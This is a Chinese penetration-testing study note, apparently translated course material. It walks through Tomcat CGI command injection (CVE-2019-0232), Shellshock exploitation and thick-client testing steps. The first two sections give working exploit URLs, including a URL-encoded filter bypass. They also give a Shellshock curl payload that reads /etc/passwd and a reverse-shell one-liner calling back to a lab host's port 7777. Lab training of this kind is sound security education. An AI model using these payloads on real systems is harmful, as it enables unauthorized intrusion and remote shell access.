+
+该 CGI 脚本可以通过命令行参数切换功能，我们可以通过下面的 URL 来调用这个脚本：
+
+```url
+http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
+```
+
+这里的 action 参数被设置为 author，表示脚本应按照作者姓名进行搜索；query 参数则指定了搜索关键词 fitzgerald。
+通过使用命令行参数，CGI 脚本可以根据用户输入，轻松在不同的搜索功能之间切换，这让脚本变得更加灵活、易用。
+
+但在Windows 系统上启用 enableCmdLineArguments 时，问题就出现了：CGI Servlet 在把浏览器传来的参数传递给 CGI 脚本之前，没有对输入做任何安全校验。这会直接导致操作系统命令注入攻击—— 攻击者可以将恶意命令注入到原有指令中，从而在目标服务器上执行任意系统命令。
+举个例子：攻击者可以用 & 作为分隔符，把 dir 命令拼接到合法指令后面，以此在 Windows 上执行目录列出操作。如果攻击者能控制这类 CGI 脚本的输入，就可以在 & 后注入任意自己想执行的命令。
+一个典型利用示例：http://example.com/cgi-bin/hello.bat?&dir该请求会把 &dir 当作参数传给 hello.bat，并在服务器上直接执行 dir 命令。
+最终，攻击者利用 CGI Servlet 的输入校验缺陷，实现了在服务器上执行任意系统命令。
+
+### 1.1 枚举
+
+使用 nmap 扫描目标系统，这将有助于精确定位当前在系统上运行的活动服务。此过程将提供有关目标系统的宝贵信息，发现正在运行的服务及其具体版本，从而更好地了解其基础架构和潜在漏洞。
+
+```bash
+$ nmap -p- -sC -Pn 10.129.204.227 --open 
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
+Nmap scan report for 10.129.204.227
+Host is up (0.17s latency).
+Not shown: 63648 closed tcp ports (conn-refused), 1873 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+22/tcp    open  ssh
+| ssh-hostkey: 
+|   2048 ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
+|   256 382e76cd0594a6e717d1808165262544 (ECDSA)
+|_  256 35096912230f11bc546fddf797bd6150 (ED25519)
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+8009/tcp  open  ajp13
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp  open  http-proxy
+|_http-title: Apache Tomcat/9.0.17
+|_http-favicon: Apache Tomcat
+47001/tcp open  winrm
+
+Host script results:
+| smb2-time: 
+|   date: 2023-03-23T11:58:42
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+
+Nmap done: 1 IP address (1 host up) scanned in 165.25 seconds
+
+```
+
+在这里我们可以看到，Nmap 已经识别出 Apache Tomcat/9.0.17 在 8080 端口上运行。
+
+### 1.2 寻找CGI脚本
+
+挖掘 Web 服务器内容的一种方式是使用 ffuf 目录枚举工具，并搭配 dirb 中的 common.txt 字典。通过经验或漏洞资料我们可以得知，CGI 脚本的默认目录是 /cgi，因此我们可以使用下面的 URL 进行模糊测试：http://10.129.204.227:8080/cgi/FUZZ.cmd或http://10.129.204.227:8080/cgi/FUZZ.bat
+
+```bash
+$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+
+
+        /'___\  /'___\           /'___\   
+       /\ \__/ /\ \__/  __  __  /\ \__/   
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  
+         \ \_\   \ \_\  \ \____/  \ \_\   
+          \/_/    \/_/   \/___/    \/_/   
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.204.227:8080/cgi/FUZZ.cmd
+ :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+:: Progress: [4614/4614] :: Job [1/1] :: 223 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
+```
+
+由于操作系统是 Windows，我们的目标是测试批处理脚本。虽然测试扩展名为 .cmd 的脚本失败，但我们通过测试扩展名为 .bat 的文件成功找到了 welcome.bat 文件。
+
+```bash
+$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+
+
+        /'___\  /'___\           /'___\   
+       /\ \__/ /\ \__/  __  __  /\ \__/   
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  
+         \ \_\   \ \_\  \ \____/  \ \_\   
+          \/_/    \/_/   \/___/    \/_/   
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.204.227:8080/cgi/FUZZ.bat
+ :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
+    * FUZZ: welcome
+
+:: Progress: [4614/4614] :: Job [1/1] :: 226 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
+
+```
+
+访问位于 http://10.129.204.227:8080/cgi/welcome.bat 的已发现 URL 会返回以下消息：
+
+```txt
+Welcome to CGI, this section is not functional yet. Please return to home page.
+```
+
+### 1.3 利用
+
+如上所述，我们可以利用 CVE-2019-0232 漏洞，通过使用批处理命令分隔符 & 附加我们自己的命令。现在，我们在枚举 http://10.129.204.227:8080/cgi/welcome.bat 处发现了一个有效的 CGI 脚本路径。
+
+```url
+http://10.129.204.227:8080/cgi/welcome.bat?&dir
+```
+
+访问上述 URL 会返回 dir 批处理命令的输出，但是尝试运行其他常见的 Windows 命令行应用程序（例如 whoami 却不会返回输出。
+
+通过调用 set 命令获取环境变量列表：
+
+```txt
+# http://10.129.204.227:8080/cgi/welcome.bat?&set
+
+Welcome to CGI, this section is not functional yet. Please return to home page.
+AUTH_TYPE=
+COMSPEC=C:\Windows\system32\cmd.exe
+CONTENT_LENGTH=
+CONTENT_TYPE=
+GATEWAY_INTERFACE=CGI/1.1
+HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+HTTP_ACCEPT_ENCODING=gzip, deflate
+HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
+HTTP_HOST=10.129.204.227:8080
+HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
+PATH_INFO=
+PROMPT=$P$G
+QUERY_STRING=&set
+REMOTE_ADDR=10.10.14.58
+REMOTE_HOST=10.10.14.58
+REMOTE_IDENT=
+REMOTE_USER=
+REQUEST_METHOD=GET
+REQUEST_URI=/cgi/welcome.bat
+SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
+SCRIPT_NAME=/cgi/welcome.bat
+SERVER_NAME=10.129.204.227
+SERVER_PORT=8080
+SERVER_PROTOCOL=HTTP/1.1
+SERVER_SOFTWARE=TOMCAT
+SystemRoot=C:\Windows
+X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
+```
+
+从列表中可以看出， PATH 变量未被设置，因此我们需要在请求中硬编码路径：
+
+```url
+http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+```
+
+尝试失败，Tomcat 返回错误信息，指出遇到了无效字符。Apache Tomcat 引入了一个补丁，利用正则表达式来阻止特殊字符的使用。然而，可以通过对有效负载进行 URL 编码来绕过此过滤器。
+
+```url
+http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+
+```
+
+## 2.攻击Shellshock
+
+[通用网关接口（CGI）](https://www.w3.org/CGI/)用于帮助 Web 服务器渲染动态页面，并为通过 Web 应用发起请求的用户生成定制化响应。CGI 程序主要用于访问 Web 服务器上运行的其他应用程序。CGI 本质上是 Web 服务器、外部数据库与信息数据源之间的中间件。
+CGI 脚本和程序存放在 Web 服务器的 /cgi-bin 目录下，可以使用 C、C++、Java、Perl 等语言编写。CGI 脚本以 Web 服务器自身的安全权限运行。它们常用于留言簿、表单（如邮件、反馈、注册）、邮件列表、博客等场景。这类脚本与编程语言无关，编写方式可以非常简洁，相比使用服务端编程语言实现复杂功能，用 CGI 实现要容易得多。
+
+CGI 脚本/应用程序通常用于以下几个原因：
+
+* 如果 Web 服务器必须与用户进行动态交互
+* 当用户通过填写表单向 Web 服务器提交数据时，CGI 应用程序会处理这些数据，并通过 Web 服务器将结果返回给用户。
+
+下面以图形方式展示了 CGI 的工作原理。
+
+![1774716068045](images/AttackingCommonApplications/1774716068045.png)
+
+大致步骤如下：
+
+1. 在 Web 服务器上创建一个目录，其中包含 CGI 脚本/应用程序。该目录通常名为 CGI-bin 。
+2. Web 应用程序用户通过 URL 向服务器发送请求，例如 https://acme.com/cgi-bin/newchiscript.pl
+3. 服务器运行脚本并将结果输出返回给 Web 客户端。
+
+使用 CGI 也存在一些缺点：CGI 程序会为每个 HTTP 请求启动一个新进程，这会占用大量服务器内存。每次都会打开一个新的数据库连接。页面加载之间无法缓存数据，这降低了效率。然而，这些风险和低效之处远大于其优势，而且 CGI 技术已经过时，无法很好地与现代 Web 应用程序兼容。它已被更快、更安全的技术所取代。但是，作为测试人员，我们仍然会不时遇到使用 CGI 的 Web 应用程序，并且在评估过程中遇到嵌入式设备时也经常会看到它。
+
+### 2.1 攻击
+
+或许最广为人知的 CGI 攻击就是利用 Shellshock 漏洞（又称“Bash 漏洞”）进行攻击。Shellshock 漏洞（ CVE-2014-6271 ）于 2014 年被发现，利用起来相对简单，而且至今仍不时会在实际环境中（例如渗透测试中）被发现。它是 Bash shell（GNU Bash 4.3 及更早版本）中的一个安全漏洞，攻击者可以利用环境变量执行非预期命令。在发现之时，这是一个存在了 25 年的漏洞，对全球企业构成了重大威胁。
+
+Shellshock 漏洞允许攻击者利用旧版本 Bash 中保存环境变量的方式不当。通常情况下，当将函数保存为变量时，shell 函数会在创建者定义的结束位置停止执行。存在漏洞的 Bash 版本允许攻击者执行包含在环境变量中存储的函数之后的操作系统命令。让我们来看一个简单的例子：定义一个环境变量，并在其后添加一条恶意命令。
+
+```shell
+$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
+
+```
+
+当设置上述变量时，Bash 会把 `y='() { :;};'` 这部分解析为一个名为 `y` 的函数定义。
+这个函数本身不做任何操作，仅返回退出码 0；但在函数被加载时，如果当前 Bash 版本存在漏洞，就会自动执行 `echo vulnerable-shellshock` 这条命令。
+
+这类命令（也可以换成任意其他命令，比如单行反弹 Shell 指令）会以**Web 服务运行账号**的权限执行。
+大多数情况下，这个账号是 `www-data` 这类低权限用户，我们虽然能拿到系统权限，但通常还需要进一步提权。
+极少数情况下运气会非常好：如果 Web 服务以高权限身份运行，我们就能直接获得 root 权限。
+
+如果系统不存在漏洞，则只会打印 "not vulnerable" 。
+
+```bash
+$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
+
+not vulnerable
+```
+
+在打过补丁的系统中，这种行为不再发生，因为 Bash 在导入函数定义后不会执行代码。此外，Bash 不再将 y=() {...} 解释为函数定义。现在，环境变量中的函数定义必须以 BASH_FUNC_ 为前缀。
+
+让我们来看一个实际例子，看看作为渗透测试人员，我们如何发现并利用这个漏洞。
+
+我们可以使用 Gobuster 等工具来查找 CGI 脚本。这里我们找到了一个， access.cgi 。
+
+```bash
+$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.204.231/cgi-bin/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              cgi
+[+] Timeout:                 10s
+===============================================================
+2023/03/23 09:26:04 Starting gobuster in directory enumeration mode
+===============================================================
+/access.cgi           (Status: 200) [Size: 0]
+                                       
+===============================================================
+2023/03/23 09:26:29 Finished
+```
+
+接下来，我们可以使用 cURL 命令访问该脚本，但会发现没有任何输出，所以这可能是一个已失效的脚本，但仍然值得进一步探索。
+
+```bash
+$ curl -i http://10.129.204.231/cgi-bin/access.cgi
+
+HTTP/1.1 200 OK
+Date: Thu, 23 Mar 2023 13:28:55 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 0
+Content-Type: text/html
+```
+
+为了检查漏洞，我们可以使用简单的 cURL 命令，或者使用 Burp Suite Repeater 或 Intruder 对 user-agent 字段进行模糊测试。这里我们可以看到 /etc/passwd 文件的内容被返回给我们，从而通过 user-agent 字段确认了该漏洞的存在。
+
+```bash
+$ curl -H 'User-Agent: () { :; }; /bin/cat /etc/passwd' http://10.129.204.231/cgi-bin/access.cgi
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+```
+
+一旦确认存在漏洞，我们可以通过多种方式获得反向 shell 访问权限。在本例中，我们使用简单的 Bash 单行命令，并在 Netcat 监听器上获取回调。
+
+```bash
+$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
+```
+
+从这里开始，我们可以搜寻敏感数据或尝试提升权限。在网络渗透测试期间，我们可以尝试利用这台主机进一步渗透到内部网络中。
+
+```bash
+$ sudo nc -lvnp 7777
+
+listening on [any] 7777 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
+bash: cannot set terminal process group (938): Inappropriate ioctl for device
+bash: no job control in this shell
+```
+
+这篇[博文](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability)包含一些缓解 Shellshock 漏洞的实用技巧。修复此漏洞最快捷的方法是更新受影响系统上的 Bash 版本。在已停止维护的 Ubuntu/Debian 系统上，这可能比较棘手，因此系统管理员可能需要先升级软件包管理器。对于某些系统（例如使用 CGI 的物联网设备），升级可能不可行。在这种情况下，最好先确保系统未暴露于互联网，然后评估是否可以停用该主机。如果这是一台关键主机，并且组织选择承担风险，则临时解决方案可能是尽可能地将主机与内部网络隔离。请记住，这只是权宜之计，最佳方案是升级或将主机离线。
+
+Shellshock 漏洞是一个存在已近十年的遗留漏洞。但这并不意味着我们不会偶尔遇到它。如果您在评估过程中遇到任何使用 CGI 脚本的 Web 应用程序（尤其是物联网设备），那么绝对值得按照本节所示的步骤深入研究。您可能已经找到了一个相对简单的漏洞入口！
+
+# 八. 胖客户端应用程序
+
+胖客户端应用是安装在我们本地计算机上的程序。与运行在远程服务器、可通过浏览器访问的瘦客户端应用不同，这类程序无需联网即可运行，且在运算处理、内存占用和存储能力上表现更优。
+
+胖客户端多用于企业环境，为特定业务场景开发，常见类型包括项目管理系统、客户关系管理系统、库存管理工具及其他办公效率软件。这类程序通常使用 Java、C++、.NET 或微软 Silverlight 技术开发。
+
+以 Java 为例，其一项关键安全机制是**沙箱（Sandbox）**技术。沙箱是一个虚拟运行环境，可让互联网下载的不可信代码在用户设备上安全执行，不会产生安全风险。它会对不可信代码进行隔离，禁止其在未获授权的情况下访问或修改系统资源与其他程序。除此之外，Java 还通过 API 权限限制、代码签名等方式进一步提升运行环境的安全性。
+
+在 .NET 技术体系中，胖客户端（也常被称作富客户端）指的是大量逻辑处理在客户端本地完成，而非完全依赖服务器完成运算的应用程序。因此，相比高度依赖服务器处理与数据存储的瘦客户端，胖客户端能提供更优的性能、更丰富的功能和更好的用户体验。
+
+浏览器、媒体播放器、聊天软件、电子游戏等都属于胖客户端。部分胖客户端可通过官方网站或第三方应用商店付费购买或免费下载；而企业定制类的专用程序，则通常由开发软件的IT部门直接分发部署。
+
+相比瘦客户端，胖客户端的部署与维护难度更高，因为补丁和更新都需要在用户本地计算机上完成。胖客户端的主要特点包括：
+
+- 可独立运行
+- 无需联网即可工作
+- 支持本地存储数据
+- 安全性相对更低
+- 占用系统资源更多
+- 开发与部署成本更高
+
+胖客户端的架构主要分为**两层架构**和**三层架构**两类。
+
+- 两层架构：程序安装在本地计算机，直接与数据库通信。
+- 三层架构：程序同样安装在本地，但与数据库交互前，会先通过 HTTP/HTTPS 协议对接应用服务器；应用服务器与数据库可处于同一内网，也可通过互联网连接。
+
+三层架构的安全性更高，因为攻击者无法直接与数据库建立通信。下图展示了两层与三层架构应用的区别。![1774717644321](images/AttackingCommonApplications/1774717644321.png)
+
+由于大部分胖客户端应用都从互联网下载，无法充分保证用户获取的是官方原版程序，这就引发了一系列安全隐患。网页应用特有的漏洞（如XSS跨站脚本、CSRF跨站请求伪造、点击劫持）并不适用于胖客户端，但胖客户端的安全性普遍低于Web应用，存在大量可被利用的攻击方式，包括：
+
+- 错误处理机制不完善
+- 硬编码敏感数据
+- DLL劫持
+- 缓冲区溢出
+- SQL注入
+- 不安全存储
+- 会话管理漏洞
+
+## 渗透测试步骤
+
+胖客户端应用的复杂度通常更高，攻击面也更广。针对胖客户端的渗透测试可结合自动化工具与手动测试开展，一般遵循以下流程：
+
+### 信息收集
+
+在此阶段，渗透测试人员需要识别应用架构、所用编程语言与开发框架，理清应用和底层基础设施的运行逻辑。同时还需明确客户端与服务端采用的技术栈，找到程序入口点和用户可输入的位置。测试人员也应排查前文提到的各类常见漏洞。
+可用于信息收集的工具包括：
+CFF Explorer、Detect It Easy、Process Monitor、Strings
+
+### 客户端攻击
+
+尽管胖客户端会在本地完成大量运算与数据存储，但仍需与服务端交互以完成数据同步、访问共享资源等任务。这种与服务端及外部系统的通信，会让胖客户端面临和Web应用类似的漏洞风险，例如命令注入、弱访问控制、SQL注入等。
+
+用户名、密码、令牌、与其他服务通信的密钥等敏感信息，可能被存储在应用的本地文件中。程序源码里也可能存在硬编码凭证等敏感数据，因此**静态分析**是测试的必要环节。借助合适工具，我们可以对EXE、DLL、JAR、CLASS、WAR等格式的.NET和Java应用进行反编译与代码审查。
+此阶段还需开展**动态分析**，因为胖客户端会在运行内存中存储敏感信息。
+常用工具：
+Ghidra、IDA、OllyDbg、Radare2、dnSpy、x64dbg、JADX、Frida
+
+### 网络层面攻击
+
+若应用会与本地或远程服务端通信，通过网络流量分析，我们可以捕获通过HTTP/HTTPS或TCP/UDP传输的敏感数据，更清晰地掌握应用的运行逻辑。
+针对胖客户端做流量分析的常用工具：
+Wireshark、tcpdump、TCPView、Burp Suite
+
+### 服务端攻击
+
+胖客户端的服务端攻击思路与Web应用一致，渗透测试人员需重点关注OWASP Top 10等主流常见漏洞。
+
+**和当前项目不符合,省略**
